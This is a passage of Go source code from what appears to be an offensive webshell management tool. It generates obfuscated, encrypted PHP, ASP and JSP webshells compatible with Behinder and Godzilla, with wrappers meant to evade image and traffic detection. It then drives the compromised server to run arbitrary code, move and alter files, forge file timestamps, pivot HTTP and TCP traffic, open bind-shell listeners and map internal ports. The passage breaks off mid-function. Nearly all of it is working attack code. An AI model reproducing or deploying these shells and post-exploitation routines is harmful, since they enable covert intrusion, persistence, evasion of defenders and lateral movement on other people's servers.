	if protocol == "" {
		protocol = "default_aes"
	}
	switch shellType {
	case "jsp":
		return jspShell(key16)
	case "aspx":
		return aspxShell(key16)
	case "asp":
		return aspShell(key16)
	case "python":
		return ShellCodePython(password, protocol)
	default:
		return phpShellByProtocol(key16, password, protocol)
	}
}

// phpShellByProtocol 按协议生成对应的 PHP webshell 代码。
// password 为原始密码（哥斯拉协议需要原文密码派生 key），key16 为 AEGIS 标准 key。
func phpShellByProtocol(key16, password, protocol string) string {
	switch protocol {
	case "behinder_v3":
		return phpShellV3()
	case "behinder_v4":
		return phpShellV4()
	case "godzilla_php_aes":
		return phpShellGodzillaAES(password)
	case "default_xor":
		return phpShellXOR(key16)
	case "default_xor_base64":
		return phpShellXORBase64(key16)
	case "default_image":
		return phpShellImage(key16)
	case "default_json":
		return phpShellJSON(key16)
	case "aes_with_magic":
		return phpShellAESWithMagic(key16)
	case "aes_gcm":
		return phpShellAESGCM(key16)
	case "default_aes_form":
		return phpShellAESForm(key16)
	default:
		return phpShellAES(key16)
	}
}

// phpShellAESForm default_aes_form：body 包装为 _=<base64>，模拟普通表单 POST
// PHP shell 优先从 $_POST['_'] 读取，回落到 php://input，与常规 AES 壳密钥相同
func phpShellAESForm(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){$k=\"" + key16 + "\";return openssl_decrypt(base64_decode($d),strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);}\n" +
		"$r=isset($_POST['_'])?$_POST['_']:(isset($_REQUEST['_'])?$_REQUEST['_']:file_get_contents(strrev('tupni//:php')));\n" +
		"@eval(f($r));\n" +
		"?>"
}

// phpShellAES default_aes：base64(AES-128-ECB(payload))
// strrev('BCE-821-SEA') == "AES-128-ECB"，strrev('tupni//:php') == "php://input"
func phpShellAES(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){$k=\"" + key16 + "\";return openssl_decrypt(base64_decode($d),strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);}\n" +
		"@eval(f(file_get_contents(strrev('tupni//:php'))));\n" +
		"?>"
}

// phpShellXOR default_xor：raw XOR 字节流
func phpShellXOR(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"$k=\"" + key16 + "\";\n" +
		"$p=file_get_contents(strrev('tupni//:php'));\n" +
		"$r='';\n" +
		"for($i=0;$i<strlen($p);$i++){$r.=$p[$i]^$k[$i%16];}\n" +
		"@eval($r);\n" +
		"?>"
}

// phpShellXORBase64 default_xor_base64：base64(XOR(payload))
func phpShellXORBase64(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"$k=\"" + key16 + "\";\n" +
		"$p=base64_decode(file_get_contents(strrev('tupni//:php')));\n" +
		"$r='';\n" +
		"for($i=0;$i<strlen($p);$i++){$r.=$p[$i]^$k[$i%16];}\n" +
		"@eval($r);\n" +
		"?>"
}

// phpShellImage default_image：PNG头(8字节)+base64(AES(payload))，绕过图片检测
func phpShellImage(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){$k=\"" + key16 + "\";return openssl_decrypt(base64_decode($d),strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);}\n" +
		"@eval(f(substr(file_get_contents(strrev('tupni//:php')),8)));\n" +
		"?>"
}

// phpShellJSON default_json：{"pass":"base64(AES(payload))"}
func phpShellJSON(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){$k=\"" + key16 + "\";return openssl_decrypt(base64_decode($d),strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);}\n" +
		"$j=json_decode(file_get_contents(strrev('tupni//:php')),true);\n" +
		"@eval(f($j['pass']??''));\n" +
		"?>"
}

// phpShellAESWithMagic aes_with_magic：16字节随机魔法前缀+base64(AES(payload))
func phpShellAESWithMagic(key16 string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){$k=\"" + key16 + "\";return openssl_decrypt(base64_decode($d),strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);}\n" +
		"@eval(f(substr(file_get_contents(strrev('tupni//:php')),16)));\n" +
		"?>"
}

// phpShellAESGCM aes_gcm：AES-256-GCM，随机 nonce，每次密文完全不同，消除流量统计特征。
// Go 侧：aes256GCMEncrypt(key32, payload) → base64(nonce||ct||tag)
// PHP 侧：base64decode → split nonce(12)/ct/tag(16) → openssl_decrypt('aes-256-gcm')
// 密钥派生：$k16=substr(md5($pass),0,16); $k32=$k16.$k16;（与 deriveKey32 一致）
func phpShellAESGCM(key16 string) string {
	key32 := key16 + key16 // 32-byte key for AES-256
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"function f($d){\n" +
		"  $k=\"" + key32 + "\";\n" +
		"  $raw=base64_decode($d);\n" +
		"  $nonce=substr($raw,0,12);\n" +
		"  $tag=substr($raw,-16);\n" +
		"  $ct=substr($raw,12,strlen($raw)-28);\n" +
		"  return openssl_decrypt($ct,'aes-256-gcm',$k,OPENSSL_RAW_DATA,$nonce,$tag);\n" +
		"}\n" +
		"@eval(f(file_get_contents(strrev('tupni//:php'))));\n" +
		"?>"
}

// phpShellV3 冰蝎 v3.0 内置加密模式：随机会话密钥（GET 握手），无硬编码 key。
// 第一次 GET 请求：生成随机 key → 存 $_SESSION['k'] → 返回 key 明文
// 后续 POST 请求：读 $_SESSION['k'] → AES-128-ECB 解密 → eval
func phpShellV3() string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"session_start();\n" +
		"if(!isset($_SESSION['k'])||strlen($_SESSION['k'])!=16){\n" +
		"    $k=substr(md5(uniqid(rand())),16);\n" +
		"    $_SESSION['k']=$k;\n" +
		"    session_write_close();\n" +
		"    echo $k;\n" +
		"}else{\n" +
		"    session_write_close();\n" +
		"    $k=$_SESSION['k'];\n" +
		"    $p=base64_decode(file_get_contents(strrev('tupni//:php')));\n" +
		"    $p=openssl_decrypt($p,strrev('BCE-821-SEA'),$k,OPENSSL_RAW_DATA);\n" +
		"    @eval($p);\n" +
		"}\n" +
		"?>"
}

// phpShellGodzillaAES 生成哥斯拉 PHP AES 兼容 Shell（可被哥斯拉 v4 客户端或 AEGIS 连接）。
// 密钥派生：key=substr(md5(strrev($pass)),0,16)
// 请求格式：md5(key+key)[32 hex] + base64(AES-128-ECB(key, phpCode))
func phpShellGodzillaAES(password string) string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"$pass='" + password + "';\n" +
		"$key=substr(md5(strrev($pass)),0,16);\n" +
		"$d=file_get_contents('php://input');\n" +
		"if(strlen($d)>32&&md5($key.$key)==substr($d,0,32)){\n" +
		"    @eval(openssl_decrypt(base64_decode(substr($d,32)),'AES-128-ECB',$key,OPENSSL_RAW_DATA));\n" +
		"    exit();\n" +
		"}\n" +
		"?>"
}

// phpShellV4 生成冰蝎 v4 真实协议 PHP Shell（与冰蝎 v4 客户端完全兼容）。
// 与 v3 的区别：POST 使用会话密钥作参数名 $_POST[$k]，而非 php://input 原始流。
func phpShellV4() string {
	return "<?php\n" +
		"@error_reporting(0);\n" +
		"session_start();\n" +
		"if(!isset($_SESSION['k'])||strlen($_SESSION['k'])!=16){\n" +
		"    $k=substr(md5(uniqid(rand())),16);\n" +
		"    $_SESSION['k']=$k;\n" +
		"    session_write_close();\n" +
		"    echo $k;\n" +
		"}else{\n" +
		"    session_write_close();\n" +
		"    $k=$_SESSION['k'];\n" +
		"    $p=base64_decode($_POST[$k]??'');\n" +
		"    $p=openssl_decrypt($p,'AES-128-ECB',$k,OPENSSL_RAW_DATA);\n" +
		"    @eval($p);\n" +
		"}\n" +
		"?>"
}

// phpShell 保留作别名（向后兼容）
func phpShell(key16 string) string { return phpShellAES(key16) }

func jspShell(key16 string) string {
	return jspShellDirect(key16)
}

func aspShell(key16 string) string {
	// 冰蝎 v4.1 ASP shell：XOR 加密（与 shell.asp 一致）
	return "<%\n" +
		"Response.CharSet=\"UTF-8\"\n" +
		"k=\"" + key16 + "\"\n" +
		"Session(\"k\")=k\n" +
		"size=Request.TotalBytes\n" +
		"content=Request.BinaryRead(size)\n" +
		"For i=1 To size\n" +
		"result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\n" +
		"Next\n" +
		"execute(result)\n" +
		"%>"
}

// PluginExec 在目标执行任意 PHP 插件代码，输出执行结果。
// code 可以是明文 PHP 或 base64 编码的 PHP 代码。
func (a *Agent) PluginExec(code string, isBase64 bool) (string, error) {
	var codeB64 string
	if isBase64 {
		// 校验必须是合法 base64 字符，防止单引号等字符注入 PHP eval 上下文
		for _, c := range code {
			if !((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
				(c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=') {
				return "", fmt.Errorf("isBase64 模式下 code 包含非法字符")
			}
		}
		codeB64 = code
	} else {
		codeB64 = base64.StdEncoding.EncodeToString([]byte(code))
	}
	phpSrc := `ob_start();eval(base64_decode('` + codeB64 + `'));$out=ob_get_clean();echo json_encode(['status'=>'200','msg'=>base64_encode($out!==false?$out:'')]);`
	result, err := a.send(phpSrc)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// ─── 文件时间戳 / 分块传输 ────────────────────────────────────────────────────

// AppendFile 追加内容到文件（不覆盖原内容）。
func (a *Agent) AppendFile(path string, content []byte) error {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspAppendFile(path, content)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	dataB64 := base64.StdEncoding.EncodeToString(content)
	code := `$p=base64_decode('` + pathB64 + `');$d=base64_decode('` + dataB64 + `');@file_put_contents($p,$d,FILE_APPEND);echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// FileTimestamp 文件时间戳（秒级 Unix）。
type FileTimestamp struct {
	Atime int64 `json:"atime"`
	Mtime int64 `json:"mtime"`
	Ctime int64 `json:"ctime"`
}

// GetFileTimestamp 获取文件 atime/mtime/ctime。仅 PHP shell 支持。
func (a *Agent) GetFileTimestamp(path string) (*FileTimestamp, error) {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return nil, errJSPNotSupported(a.shellType, "获取文件时间戳")
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');$r=['atime'=>(int)@fileatime($p),'mtime'=>(int)@filemtime($p),'ctime'=>(int)@filectime($p)];echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($r))]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var ts FileTimestamp
	if err := json.Unmarshal(raw, &ts); err != nil {
		return nil, err
	}
	return &ts, nil
}

// UpdateFileTimestamp 修改文件时间戳（touch）。仅 PHP shell 支持。
func (a *Agent) UpdateFileTimestamp(path string, atime, mtime int64) error {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return errJSPNotSupported(a.shellType, "修改文件时间戳")
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := fmt.Sprintf(`$p=base64_decode('%s');@touch($p,%d,%d);echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`, pathB64, mtime, atime)
	_, err := a.send(code)
	return err
}

// CreateFile 在目标创建空文件（已存在则忽略）。
func (a *Agent) CreateFile(path string) error {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspCreateFile(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');if(!file_exists($p))@file_put_contents($p,'');echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// CheckFileExist 检查目标路径是否存在。
func (a *Agent) CheckFileExist(path string) (bool, error) {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspCheckFileExist(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');echo json_encode(['status'=>'200','msg'=>base64_encode(file_exists($p)?'1':'0')]);`
	result, err := a.send(code)
	if err != nil {
		return false, err
	}
	raw, err := decodeMsg(result)
	return string(raw) == "1", err
}

// DownloadFilePart 分块下载文件（blockIndex 从 0 开始，blockSize 字节）。返回该块原始字节。
func (a *Agent) DownloadFilePart(path string, blockIndex, blockSize int) ([]byte, error) {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := fmt.Sprintf(
		`$p=base64_decode('%s');$f=@fopen($p,'rb');if(!$f){echo json_encode(['status'=>'200','msg'=>base64_encode('')]);}else{@fseek($f,%d*%d,SEEK_SET);$d=@fread($f,%d);fclose($f);echo json_encode(['status'=>'200','msg'=>base64_encode(base64_encode($d!==false?$d:''))]);}`+"\n",
		pathB64, blockIndex, blockSize, blockSize,
	)
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	outer, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	inner, err := base64.StdEncoding.DecodeString(string(outer))
	return inner, err
}

// UpdateFileChunk 分块上传（写入文件指定块偏移，blockIndex 从 0 开始）。
func (a *Agent) UpdateFileChunk(path string, blockIndex, blockSize int, data []byte) error {
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	dataB64 := base64.StdEncoding.EncodeToString(data)
	code := fmt.Sprintf(
		`$p=base64_decode('%s');$d=base64_decode('%s');$f=@fopen($p,'r+b');if(!$f)$f=@fopen($p,'wb');if($f){@fseek($f,%d*%d,SEEK_SET);@fwrite($f,$d);fclose($f);}echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`+"\n",
		pathB64, dataB64, blockIndex, blockSize,
	)
	_, err := a.send(code)
	return err
}

// ─── SOCKS 清理 ────────────────────────────────────────────────────────────────

// SocksClear 清理 PHP 端所有 SOCKS 隧道 Session 缓冲。
func (a *Agent) SocksClear() error {
	code := `@session_start();foreach(array_keys($_SESSION) as $k){if(strpos($k,'run_')===0||strpos($k,'writebuf_')===0||strpos($k,'readbuf_')===0)unset($_SESSION[$k]);}session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// ─── 异步插件 ──────────────────────────────────────────────────────────────────

// PluginSubmit 异步提交 PHP 插件（finish 后台运行，立即返回）。
func (a *Agent) PluginSubmit(taskID, phpCode string) error {
	taskB64 := base64.StdEncoding.EncodeToString([]byte(taskID))
	codeB64 := base64.StdEncoding.EncodeToString([]byte(phpCode))
	okB64 := base64.StdEncoding.EncodeToString([]byte("ok"))
	src := "@error_reporting(0);\n@set_time_limit(0);\n@ignore_user_abort(1);\n@session_start();\n" +
		"$tid=base64_decode('" + taskB64 + "');\n" +
		"if(isset($_SESSION[$tid])&&$_SESSION[$tid]['running']==='true'){session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode('already_running')]);exit;}\n" +
		"$_SESSION[$tid]=['running'=>'true','result'=>''];\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$_resp='{\"status\":\"200\",\"msg\":\"" + okB64 + "\"}';\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($_resp));\n" +
		"echo $_resp;flush();\n" +
		"$_code=base64_decode('" + codeB64 + "');\n" +
		"ob_start();eval($_code);$_out=ob_get_clean();\n" +
		"@session_start();\n" +
		"$_SESSION[$tid]['result']=$_out;\n" +
		"$_SESSION[$tid]['running']='false';\n" +
		"session_write_close();\n"
	_, err := a.send(src)
	return err
}

// PluginGetResult 获取异步插件执行状态和结果。
func (a *Agent) PluginGetResult(taskID string) (running bool, result string, err error) {
	taskB64 := base64.StdEncoding.EncodeToString([]byte(taskID))
	src := "@session_start();\n" +
		"$tid=base64_decode('" + taskB64 + "');\n" +
		"$run=isset($_SESSION[$tid]['running'])&&$_SESSION[$tid]['running']==='true';\n" +
		"$res=isset($_SESSION[$tid]['result'])?$_SESSION[$tid]['result']:'';\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode(['running'=>$run,'result'=>base64_encode($res)]))]);\n"
	res, err2 := a.send(src)
	if err2 != nil {
		return false, "", err2
	}
	raw, err2 := decodeMsg(res)
	if err2 != nil {
		return false, "", err2
	}
	var payload struct {
		Running bool   `json:"running"`
		Result  string `json:"result"`
	}
	if err2 := json.Unmarshal(raw, &payload); err2 != nil {
		return false, "", err2
	}
	out, _ := base64.StdEncoding.DecodeString(payload.Result)
	return payload.Running, string(out), nil
}

// PluginStop 停止异步插件（将 running 设为 false）。
func (a *Agent) PluginStop(taskID string) error {
	taskB64 := base64.StdEncoding.EncodeToString([]byte(taskID))
	src := "@session_start();\n$tid=base64_decode('" + taskB64 + "');\n" +
		"if(isset($_SESSION[$tid]))$_SESSION[$tid]['running']='false';\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n"
	_, err := a.send(src)
	return err
}

// ─── Transfer 内网穿透 ─────────────────────────────────────────────────────────

// TransferHTTP 通过 Shell 发出 HTTP 请求，返回响应体。
func (a *Agent) TransferHTTP(method, targetURL, headers, body string) (string, error) {
	methodB64 := base64.StdEncoding.EncodeToString([]byte(method))
	urlB64 := base64.StdEncoding.EncodeToString([]byte(targetURL))
	headersB64 := base64.StdEncoding.EncodeToString([]byte(headers))
	bodyB64 := base64.StdEncoding.EncodeToString([]byte(body))
	code := "$_m=base64_decode('" + methodB64 + "');$_u=base64_decode('" + urlB64 + "');$_h=base64_decode('" + headersB64 + "');$_b=base64_decode('" + bodyB64 + "');\n" +
		`$_ctx=stream_context_create(['http'=>['method'=>$_m,'header'=>$_h,'content'=>$_b,'ignore_errors'=>true,'timeout'=>15]]);` +
		`$_r=@file_get_contents($_u,false,$_ctx);` +
		`echo json_encode(['status'=>'200','msg'=>base64_encode($_r!==false?$_r:'')]);`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// TransferTCPForward 通过 Shell TCP socket 转发数据（单次请求/响应）。
func (a *Agent) TransferTCPForward(host, port, payload string) (string, error) {
	hostB64 := base64.StdEncoding.EncodeToString([]byte(host))
	portB64 := base64.StdEncoding.EncodeToString([]byte(port))
	payloadB64 := base64.StdEncoding.EncodeToString([]byte(payload))
	code := "$_h=base64_decode('" + hostB64 + "');$_p=base64_decode('" + portB64 + "');$_d=base64_decode('" + payloadB64 + "');\n" +
		`$_s=@stream_socket_client("tcp://{$_h}:{$_p}",$_e,$_em,10);` +
		`if(!$_s){echo json_encode(['status'=>'200','msg'=>base64_encode('error: '.$_em)]);}else{` +
		`fwrite($_s,$_d);$_r='';$_n=0;` +
		`while(!feof($_s)&&$_n<65536){$_c=fread($_s,4096);if($_c===false||$_c==='')break;$_r.=$_c;$_n+=strlen($_c);}` +
		`fclose($_s);echo json_encode(['status'=>'200','msg'=>base64_encode($_r)]);}`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// ─── BShell（绑定 Shell 管理）────────────────────────────────────────────────

// BShellListen 在目标端口监听，等待反弹 Shell 接入（后台运行，finish 模式）。
func (a *Agent) BShellListen(listenPort int) error {
	portStr := fmt.Sprintf("%d", listenPort)
	portB64 := base64.StdEncoding.EncodeToString([]byte(portStr))
	okB64 := base64.StdEncoding.EncodeToString([]byte("ok"))
	src := "@error_reporting(0);\n@set_time_limit(0);\n@ignore_user_abort(1);\n@session_start();\n" +
		"$_lp=(int)base64_decode('" + portB64 + "');\n" +
		"$_SESSION['bshell_running_'.$_lp]=true;\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$_resp='{\"status\":\"200\",\"msg\":\"" + okB64 + "\"}';\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($_resp));\n" +
		"echo $_resp;flush();\n" +
		"$_srv=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);\n" +
		"@socket_set_option($_srv,SOL_SOCKET,SO_REUSEADDR,1);\n" +
		"@socket_bind($_srv,'0.0.0.0',$_lp);\n" +
		"@socket_listen($_srv,5);\n" +
		"@socket_set_nonblock($_srv);\n" +
		"while(true){\n" +
		"  @session_start();\n" +
		"  $_run=isset($_SESSION['bshell_running_'.$_lp])?$_SESSION['bshell_running_'.$_lp]:false;\n" +
		"  session_write_close();\n" +
		"  if(!$_run)break;\n" +
		"  $_cli=@socket_accept($_srv);\n" +
		"  if($_cli){\n" +
		"    @socket_getpeername($_cli,$_addr,$_cp);\n" +
		"    $_key='BShell_Reverse_'.$_addr.':'.$_cp;\n" +
		"    @socket_set_nonblock($_cli);\n" +
		"    @session_start();\n" +
		"    $_SESSION[$_key]=true;\n" +
		"    $_SESSION[$_key.'_read']='';\n" +
		"    $_SESSION[$_key.'_write']='';\n" +
		"    session_write_close();\n" +
		"    while(true){\n" +
		"      @session_start();\n" +
		"      $_run2=isset($_SESSION['bshell_running_'.$_lp])?$_SESSION['bshell_running_'.$_lp]:false;\n" +
		"      $_wb=isset($_SESSION[$_key.'_write'])?$_SESSION[$_key.'_write']:'';\n" +
		"      if($_wb!==''){@socket_write($_cli,$_wb);$_SESSION[$_key.'_write']='';}\n" +
		"      session_write_close();\n" +
		"      if(!$_run2)break;\n" +
		"      $_rb=@socket_read($_cli,4096,PHP_BINARY_READ);\n" +
		"      if($_rb!==false&&$_rb!==''){\n" +
		"        @session_start();$_SESSION[$_key.'_read'].=$_rb;session_write_close();\n" +
		"      }elseif($_rb===false){break;}\n" +
		"      usleep(100000);\n" +
		"    }\n" +
		"    @session_start();unset($_SESSION[$_key],$_SESSION[$_key.'_read'],$_SESSION[$_key.'_write']);session_write_close();\n" +
		"    @socket_close($_cli);\n" +
		"  }\n" +
		"  usleep(200000);\n" +
		"}\n" +
		"@socket_close($_srv);\n"
	_, err := a.send(src)
	return err
}

// BShellList 列出当前活跃的 BShell 会话（addr:port 列表）。
func (a *Agent) BShellList() ([]string, error) {
	code := `@session_start();$_list=[];foreach(array_keys($_SESSION) as $_k){if(strpos($_k,'BShell_Reverse_')===0&&strpos($_k,'_read')===false&&strpos($_k,'_write')===false)$_list[]=str_replace('BShell_Reverse_','',$_k);}session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($_list))]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var list []string
	if err := json.Unmarshal(raw, &list); err != nil {
		return nil, err
	}
	return list, nil
}

// BShellRead 读取 BShell 会话输出（addrPort 格式如 "1.2.3.4:12345"）。
func (a *Agent) BShellRead(addrPort string) ([]byte, error) {
	keyB64 := base64.StdEncoding.EncodeToString([]byte("BShell_Reverse_" + addrPort))
	code := "@session_start();\n$_k=base64_decode('" + keyB64 + "');\n" +
		"$_buf=isset($_SESSION[$_k.'_read'])?$_SESSION[$_k.'_read']:'';\n" +
		"$_SESSION[$_k.'_read']='';\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode(base64_encode($_buf))]);\n"
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	outer, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	inner, err := base64.StdEncoding.DecodeString(string(outer))
	return inner, err
}

// BShellWrite 向 BShell 会话写入数据。
func (a *Agent) BShellWrite(addrPort string, data []byte) error {
	keyB64 := base64.StdEncoding.EncodeToString([]byte("BShell_Reverse_" + addrPort))
	dataB64 := base64.StdEncoding.EncodeToString(data)
	code := "@session_start();\n$_k=base64_decode('" + keyB64 + "');\n" +
		"$_SESSION[$_k.'_write'].=base64_decode('" + dataB64 + "');\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n"
	_, err := a.send(code)
	return err
}

// BShellStop 停止指定端口的 BShell 监听。
func (a *Agent) BShellStop(listenPort int) error {
	portB64 := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%d", listenPort)))
	code := "@session_start();\n$_lp=(int)base64_decode('" + portB64 + "');\n" +
		"$_SESSION['bshell_running_'.$_lp]=false;\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n"
	_, err := a.send(code)
	return err
}

// ─── ReversePortMap（目标端监听，接收内网连接）────────────────────────────────

// ReversePortMapCreate 在目标上监听端口，接受内网连接后通过 Session 中继（后台运行）。
func (a *Agent) ReversePortMapCreate(listenPort int) error {
	portStr := fmt.Sprintf("%d", listenPort)
	portB64 := base64.StdEncoding.EncodeToString([]byte(portStr))
	okB64 := base64.StdEncoding.EncodeToString([]byte("ok"))
	src := "@error_reporting(0);\n@set_time_limit(0);\n@ignore_user_abort(1);\n@session_start();\n" +
		"$_lp=(int)base64_decode('" + portB64 + "');\n" +
		"$_SESSION['rportmap_running_'.$_lp]=true;\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$_resp='{\"status\":\"200\",\"msg\":\"" + okB64 + "\"}';\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($_resp));\n" +
		"echo $_resp;flush();\n" +
		"$_srv=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);\n" +
		"@socket_set_option($_srv,SOL_SOCKET,SO_REUSEADDR,1);\n" +
		"@socket_bind($_srv,'0.0.0.0',$_lp);\n" +
		"@socket_listen($_srv,5);\n" +
		"@socket_set_nonblock($_srv);\n" +
		"while(true){\n" +
		"  @session_start();\n" +
		"  $_run=isset($_SESSION['rportmap_running_'.$_lp])?$_SESSION['rportmap_running_'.$_lp]:false;\n" +
		"  session_write_close();\n" +
		"  if(!$_run)break;\n" +
		"  $_cli=@socket_accept($_srv);\n" +
		"  if($_cli){\n" +
		"    @socket_getpeername($_cli,$_addr,$_cp);\n" +
		"    $_sk='reverseportmap_socket_'.$_lp.'_'.$_addr.'_'.$_cp;\n" +
		"    @socket_set_nonblock($_cli);\n" +
		"    @session_start();\n" +
		"    $_SESSION[$_sk]=true;\n" +
		"    $_SESSION[$_sk.'_read']='';\n" +
		"    $_SESSION[$_sk.'_write']='';\n" +
		"    session_write_close();\n" +
		"    while(true){\n" +
		"      @session_start();\n" +
		"      $_run2=isset($_SESSION['rportmap_running_'.$_lp])?$_SESSION['rportmap_running_'.$_lp]:false;\n" +
		"      $_wb=isset($_SESSION[$_sk.'_write'])?$_SESSION[$_sk.'_write']:'';\n" +
		"      if($_wb!==''){@socket_write($_cli,$_wb);$_SESSION[$_sk.'_write']='';}\n" +
		"      session_write_close();\n" +
		"      if(!$_run2)break;\n" +
		"      $_rb=@socket_read($_cli,4096,PHP_BINARY_READ);\n" +
		"      if($_rb!==false&&$_rb!==''){\n" +
		"        @session_start();$_SESSION[$_sk.'_read'].=$_rb;session_write_close();\n" +
		"      }elseif($_rb===false){break;}\n" +
		"      usleep(100000);\n" +
		"    }\n" +
		"    @session_start();unset($_SESSION[$_sk],$_SESSION[$_sk.'_read'],$_SESSION[$_sk.'_write']);session_write_close();\n" +
		"    @socket_close($_cli);\n" +
		"  }\n" +
		"  usleep(200000);\n" +
		"}\n" +
		"@socket_close($_srv);\n"
	_, err := a.send(src)
	return err
}

// ReversePortMapList 列出活跃的反向端口映射连接（格式 "port_addr_cport"）。
func (a *Agent) ReversePortMapList() ([]string, error) {
	code := `@session_start();$_list=[];foreach(array_keys($_SESSION) as $_k){if(strpos($_k,'reverseportmap_socket_')===0&&strpos($_k,'_read')===false&&strpos($_k,'_write')===false)$_list[]=$_k;}session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($_list))]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var list []string
	if err := json.Unmarshal(raw, &list); err != nil {
		return nil, err
	}
	return list, nil
}

// ReversePortMapRead 读取指定连接的缓冲数据。
func (a *Agent) ReversePortMapRead(sessionKey string) ([]byte, error) {
	keyB64 := base64.StdEncoding.EncodeToString([]byte(sessionKey))
	code := "@session_start();\n$_k=base64_decode('" + keyB64 + "');\n" +
		"$_buf=isset($_SESSION[$_k.'_read'])?$_SESSION[$_k.'_read']:'';\n" +
		"$_SESSION[$_k.'_read']='';\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode(base64_encode($_buf))]);\n"
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	outer, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	inner, err := base64.StdEncoding.DecodeString(string(outer))
	return inner, err
}

// ReversePortMapWrite 向指定连接写入数据。
func (a *Agent) ReversePortMapWrite(sessionKey string, data []byte) error {
	keyB64 := base64.StdEncoding.EncodeToString([]byte(sessionKey))
	dataB64 := base64.StdEncoding.EncodeToString(data)
	code := "@session_start();\n$_k=base64_decode('" + keyB64 + "');\n" +
		"$_SESSION[$_k.'_write'].=base64_decode('" + dataB64 + "');\n" +
		"session_write_close();\n" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n"
	_, err := a.send(code)
	return err
}

// ReversePortMapStop 停止指定端口的反向端口映射监听。
func (a *Agent) ReversePortMapStop(listenPort int) error {
	portB64 := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%d", listenPort)))
	code := "@session_start();\n$_lp=(int)base64_decode('" + portB64 + "');\n" +
		"$_SESSION['rportmap_running_'.$_lp]=false;\n" +
